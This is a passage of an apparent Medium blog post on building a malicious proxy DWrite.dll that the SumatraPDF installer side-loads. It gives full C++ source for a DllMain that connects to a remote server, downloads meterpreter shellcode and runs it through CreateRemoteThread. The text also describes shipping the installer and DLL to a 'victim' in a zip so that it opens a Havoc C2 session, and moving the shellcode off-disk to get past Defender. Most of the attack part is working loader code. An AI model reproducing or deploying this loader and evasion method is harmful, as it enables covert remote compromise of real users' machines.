break;<br> case DLL_PROCESS_DETACH:<br> break;<br> }<br> return TRUE;<br>}</p></blockquote><p id="64e0" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We do acouple things to change the code above from the original Spartacus output. The important thing is the pragma comments (only one in my case) on the top that will basically run the DWrite.dll export table. I delete hModule and the DebugToFile() function that were included by default in our Sparticus tempalte. We also copy and paste the msfvenom shellcode we created for the Stage 1 payload into the variable <em class="rl">shellcode</em> as seen above. Then, we create a Payload() function that actually executes <em class="rl">shellcode</em> using RemoteThread from our SumatraPDF executable.</p><div class="xe vy xf xg ac r cv"><div class="xh xi xj xk xl m fm"><h2 class="xm b xn xo xp xq xr">Get Sam Rothlisberger’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="xv uj xw xx ui xy ac"><span class="bg b bh ab bl"><div class="xz ac cv"><div class="ac xz fj fi bq ya yb de mb yc yd ye yf yg yh yi"><input class="yj al aj an yk yl gd ln bm ym bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l uz cb"><div class="xs xt xu"><button class="bg b bh ab yn to yo yp yq yr wi fc fd ys yt yu fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab yn to yo yp yq yr wi fc fd ys yt yu fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="qy m"><div id="g-recaptcha"></div></div></div><p id="9be6" class="pw-post-body-paragraph ng nh hl ni b ij nk nl im nn no np nr ns nt nv nw nx nz oa xg ob he bl" data-selectable-paragraph="">I first wanted to make sure that my DWrite.DLL is working correctly by turning off Defender first and we can see in procmon below that our custom DLL is loaded first and then it queues to load the original in C:\Windows\System32\DWrite.dll. Sweet, we have achieved DLL proxying and side-loading so the program won’t crash.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sr"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eSkrHwcJz9iHynheLRqygQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*eSkrHwcJz9iHynheLRqygQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eSkrHwcJz9iHynheLRqygQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eSkrHwcJz9iHynheLRqygQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eSkrHwcJz9iHynheLRqygQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eSkrHwcJz9iHynheLRqygQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eSkrHwcJz9iHynheLRqygQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*eSkrHwcJz9iHynheLRqygQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="288" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*eSkrHwcJz9iHynheLRqygQ.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Procmon POC: Malicious DLL in SumatraPDF Installer folder loaded first</figcaption></figure><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm ss"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AC19PEZUGrk1ZWlmA85ULg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*AC19PEZUGrk1ZWlmA85ULg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*AC19PEZUGrk1ZWlmA85ULg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*AC19PEZUGrk1ZWlmA85ULg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*AC19PEZUGrk1ZWlmA85ULg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*AC19PEZUGrk1ZWlmA85ULg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*AC19PEZUGrk1ZWlmA85ULg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*AC19PEZUGrk1ZWlmA85ULg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="301" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*AC19PEZUGrk1ZWlmA85ULg.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Procmon POC: legit DLL in C:\Windows\system32 executed by the export definitions in our Malicious DLL</figcaption></figure><h3 id="ae6c" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Test AV/EDR detection</h3><p id="1d0d" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">We can send SumatraPDF-3.5.2–64-install.exe and our new DLL to the Victim in a zip file. This still won’t bypass protections like applocker, but you can get to that point with some basic bypasses. The executable will look like and act like a setup executable for SumatraPDF, but also make a connection with Havoc C2 in the background.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div class="pl pm st"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 1100w, https://miro.medium.com/v2/resize:fit:582/format:webp/1*9c9vs3950ZOz1KaWx7tRhA.png 582w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 291px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*9c9vs3950ZOz1KaWx7tRhA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9c9vs3950ZOz1KaWx7tRhA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9c9vs3950ZOz1KaWx7tRhA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9c9vs3950ZOz1KaWx7tRhA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9c9vs3950ZOz1KaWx7tRhA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*9c9vs3950ZOz1KaWx7tRhA.png 1100w, https://miro.medium.com/v2/resize:fit:582/1*9c9vs3950ZOz1KaWx7tRhA.png 582w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 291px"><img alt="" class="bi mn py c" width="291" height="268" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:291/1*9c9vs3950ZOz1KaWx7tRhA.png"></picture></div></figure></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm su"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*KlvCxGe0EPSS8TBVTCrugg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*KlvCxGe0EPSS8TBVTCrugg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*KlvCxGe0EPSS8TBVTCrugg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*KlvCxGe0EPSS8TBVTCrugg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*KlvCxGe0EPSS8TBVTCrugg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*KlvCxGe0EPSS8TBVTCrugg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*KlvCxGe0EPSS8TBVTCrugg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*KlvCxGe0EPSS8TBVTCrugg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="244" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*KlvCxGe0EPSS8TBVTCrugg.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><h3 id="5c18" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Try harder</h3><p id="8b43" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">After turning Defender back on and trying to run the executable, we find it still catches the malicious DLL. Specifically, it detects the meterpreter shellcode hardcoded in the <em class="rl">shellcode</em> variable. We need to find a way to load this shellcode without putting it in the DLL directly. For this, we’re going to dissect parts of the resource below to instead load the <em class="rl">shellcode</em> variable from our remote server into local memory on the victim, which should mitigate us needing to have it hardcoded in the script:</p><div class="qi qj qk ql qm qn"><a href="https://github.com/SaadAhla/Shellcode-Hide/blob/main/4%20-%20Fileless%20Shellcode/1%20-%20Using%20Sockets/FilelessShellcode.cpp?source=post_page-----733d423fc67b---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qo ac cb"><div class="qp ac cv ci cd qq"><h2 class="bg hm qr ab ga qs qt qu qv qw qx hk bl">Shellcode-Hide/4 - Fileless Shellcode/1 - Using Sockets/FilelessShellcode.cpp at main ·…</h2><div class="qy m"><h3 class="bg b qr ab ga qs qt qu qv qw qx eb">This repo contains : simple shellcode Loader , Encoders (base64 - custom - UUID - IPv4 - MAC), Encryptors (AES)…</h3></div><div class="qz m"><p class="bg b ec ab ga qs qt qu qv qw qx eb">github.com</p></div></div><div class="ra m"><div class="yv m rc rd re ra rf mn qn"></div></div></div></a></div><blockquote class="ri rj rk"><p id="b529" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">#pragma once<br>#include &lt;winsock2.h&gt;<br>#include &lt;ws2tcpip.h&gt;<br>#include &lt;Windows.h&gt;<br>#include &lt;stdio.h&gt;<br>#include “ios”<br>#include “fstream”<br>char ip[] = “10.0.2.9”;<br>char port[] = “80”;<br>char resource[] = “iloveblogs.bin”;<br>#pragma comment(lib, “ntdll”)<br>#pragma comment(linker,”/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,<a class="ah rn" href="http://twitter.com/1" rel="noopener ugc nofollow" target="_blank">@1</a>")<br>#pragma comment (lib, “Ws2_32.lib”)<br>#pragma comment (lib, “Mswsock.lib”)<br>#pragma comment (lib, “AdvApi32.lib”)<br>#define NtCurrentProcess() ((HANDLE)-1)<br>#define DEFAULT_BUFLEN 4096<br>#ifndef NT_SUCCESS<br>#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)<br>#endif<br>EXTERN_C NTSTATUS NtAllocateVirtualMemory(<br> HANDLE ProcessHandle,<br> PVOID* BaseAddress,<br> ULONG_PTR ZeroBits,<br> PSIZE_T RegionSize,<br> ULONG AllocationType,<br> ULONG Protect<br>);<br>EXTERN_C NTSTATUS NtProtectVirtualMemory(<br> IN HANDLE ProcessHandle,<br> IN OUT PVOID* BaseAddress,<br> IN OUT PSIZE_T RegionSize,<br> IN ULONG NewProtect,<br> OUT PULONG OldProtect);<br>EXTERN_C NTSTATUS NtCreateThreadEx(<br> OUT PHANDLE hThread,<br> IN ACCESS_MASK DesiredAccess,<br> IN PVOID ObjectAttributes,<br> IN HANDLE ProcessHandle,<br> IN PVOID lpStartAddress,<br> IN PVOID lpParameter,<br> IN ULONG Flags,<br> IN SIZE_T StackZeroBits,<br> IN SIZE_T SizeOfStackCommit,<br> IN SIZE_T SizeOfStackReserve,<br> OUT PVOID lpBytesBuffer<br>);<br>EXTERN_C NTSTATUS NtWaitForSingleObject(<br> IN HANDLE Handle,<br> IN BOOLEAN Alertable,<br> IN PLARGE_INTEGER Timeout<br>);<br>void getShellcode_Run(char* host, char* port, char* resource) {<br> DWORD oldp = 0;<br> BOOL returnValue;<br> size_t origsize = strlen(host) + 1;<br> const size_t newsize = 100;<br> size_t convertedChars = 0;<br> wchar_t Whost[newsize];<br> mbstowcs_s(&amp;convertedChars, Whost, origsize, host, _TRUNCATE);<br> WSADATA wsaData;<br> SOCKET ConnectSocket = INVALID_SOCKET;<br> struct addrinfo* result = NULL,<br> * ptr = NULL,<br> hints;<br> char sendbuf[MAX_PATH] = “”;<br> lstrcatA(sendbuf, “GET /”);<br> lstrcatA(sendbuf, resource);<br> char recvbuf[DEFAULT_BUFLEN];<br> memset(recvbuf, 0, DEFAULT_BUFLEN);<br> int iResult;<br> int recvbuflen = DEFAULT_BUFLEN;<br> // Initialize Winsock<br> iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);<br> if (iResult!= 0) {<br> printf(“WSAStartup failed with error: %d\n”, iResult);<br> return;<br> }<br> ZeroMemory(&amp;hints, sizeof(hints));<br> hints.ai_family = PF_INET;<br> hints.ai_socktype = SOCK_STREAM;<br> hints.ai_protocol = IPPROTO_TCP;<br> // Resolve the server address and port<br> iResult = getaddrinfo(host, port, &amp;hints, &amp;result);<br> if (iResult!= 0) {<br> printf(“getaddrinfo failed with error: %d\n”, iResult);<br> WSACleanup();<br> return;<br> }<br> // Attempt to connect to an address until one succeeds<br> for (ptr = result; ptr!= NULL; ptr = ptr-&gt;ai_next) {<br> // Create a SOCKET for connecting to server<br> ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype,<br> ptr-&gt;ai_protocol);<br> if (ConnectSocket == INVALID_SOCKET) {<br> printf(“socket failed with error: %ld\n”, WSAGetLastError());<br> WSACleanup();<br> return;<br> }<br> // Connect to server.<br> printf(“[+] Connect to %s:%s”, host, port);<br> iResult = connect(ConnectSocket, ptr-&gt;ai_addr, (int)ptr-&gt;ai_addrlen);<br> if (iResult == SOCKET_ERROR) {<br> closesocket(ConnectSocket);<br> ConnectSocket = INVALID_SOCKET;<br> continue;<br> }<br> break;<br> }<br> freeaddrinfo(result);<br> if (ConnectSocket == INVALID_SOCKET) {<br> printf(“Unable to connect to server!\n”);<br> WSACleanup();<br> return;<br> }<br> // Send an initial buffer<br> iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);<br> if (iResult == SOCKET_ERROR) {<br> printf(“send failed with error: %d\n”, WSAGetLastError());<br> closesocket(ConnectSocket);<br> WSACleanup();<br> return;<br> }<br> printf(“\n[+] Sent %ld Bytes\n”, iResult);</p><p id="33fd" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">// shutdown the connection since no more data will be sent<br> iResult = shutdown(ConnectSocket, SD_SEND);<br> if (iResult == SOCKET_ERROR) {<br> printf(“shutdown failed with error: %d\n”, WSAGetLastError());<br> closesocket(ConnectSocket);<br> WSACleanup();<br> return;<br> }</p><p id="4faa" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">// Receive until the peer closes the connection<br> do {<br> iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);<br> if (iResult &gt; 0)<br> printf(“[+] Received %d Bytes\n”, iResult);<br> else if (iResult == 0)<br> printf(“[+] Connection closed\n”);<br> else<br> printf(“recv failed with error: %d\n”, WSAGetLastError());<br> //EXECUTE SHELLCODE (BUF) START<br> HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());<br> PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);<br> WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);<br> HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);<br> CloseHandle(processHandle);<br> // EXECUTE SHELLCODE (BUF) END<br> } while (iResult &gt; 0);<br> // cleanup<br> closesocket(ConnectSocket);<br> WSACleanup();<br>}<br>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)<br>{<br> switch (fdwReason)<br> {<br> case DLL_PROCESS_ATTACH:<br> getShellcode_Run(ip, port, resource);<br> break;<br> case DLL_THREAD_ATTACH:<br> break;<br> case DLL_THREAD_DETACH:<br> break;<br> case DLL_PROCESS_DETACH:<br> break;<br> }<br> return TRUE;<br>}</p></blockquote><p id="2090" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">I basically copied the whole script over to my dllmain.cpp. I kept the pragma comments I need (1 comment in my case) from my Sparticus output:</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UKMEqNwpunqitLhREACt9A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UKMEqNwpunqitLhREACt9A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UKMEqNwpunqitLhREACt9A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UKMEqNwpunqitLhREACt9A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UKMEqNwpunqitLhREACt9A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UKMEqNwpunqitLhREACt9A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*UKMEqNwpunqitLhREACt9A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*UKMEqNwpunqitLhREACt9A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UKMEqNwpunqitLhREACt9A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UKMEqNwpunqitLhREACt9A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UKMEqNwpunqitLhREACt9A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UKMEqNwpunqitLhREACt9A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UKMEqNwpunqitLhREACt9A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*UKMEqNwpunqitLhREACt9A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="28" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*UKMEqNwpunqitLhREACt9A.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="6a6d" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">and put the Create Thread Process in my original payload() function to now run in the getShellcode_Run() function. I also changed the variable <em class="rl">shellcode</em> to <em class="rl">recvbuf</em> when executing the new thread on the process with our meterpreter shellcode.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sx"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mNHKBQOFSOGNd-M5Vtk__A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*mNHKBQOFSOGNd-M5Vtk__A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mNHKBQOFSOGNd-M5Vtk__A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mNHKBQOFSOGNd-M5Vtk__A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mNHKBQOFSOGNd-M5Vtk__A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mNHKBQOFSOGNd-M5Vtk__A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mNHKBQOFSOGNd-M5Vtk__A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*mNHKBQOFSOGNd-M5Vtk__A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) 